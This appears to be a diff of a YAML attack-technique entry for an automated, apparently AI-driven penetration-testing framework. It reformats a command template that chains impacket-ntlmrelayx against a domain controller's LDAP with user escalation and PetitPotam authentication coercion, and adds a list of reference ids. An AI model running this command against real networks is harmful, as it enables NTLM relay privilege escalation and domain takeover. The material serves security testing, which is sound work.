@@ -6,8 +6,8 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user '{username}'
-  && python3 PetitPotam.py {attacker_ip} {target_ip}
+command_template: impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user '{username}' && python3 PetitPotam.py {attacker_ip}
+  {target_ip}
 parser: generic_parser
 expected_effects:
 - coerced_auth
@@ -16,6 +16,30 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'Don''t forget that you cannot only steal the hash or the authentication
-  but also **perform NTLM relay attacks**: - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)'
+mechanism: 'Don''t forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
+  - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)'
 hacktricks_ref: generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
+references:
+  ocd_mindmap_node_ids:
+  - 0899176bed
+  - 13896beabf
+  - 14bdd8e60e
+  - 37e8774343
+  - 482ff8f95d
+  - 4a813f076f
+  - 4a8c25b65d
+  - 4e7ae0f651
+  - 56e11ecbe7
+  - 610a95136e
+  - 7ce9416a5f
+  - 874b638f73
+  - 9a2cae2e0f
+  - 9b60e20338
+  - 9dd920c832
+  - 9fb9ec425a
+  - a45ce67f67
+  - aded367da3
+  - c7c07946a0
+  - d344079757
+  - e14fed8928
+  - e2afb7298e
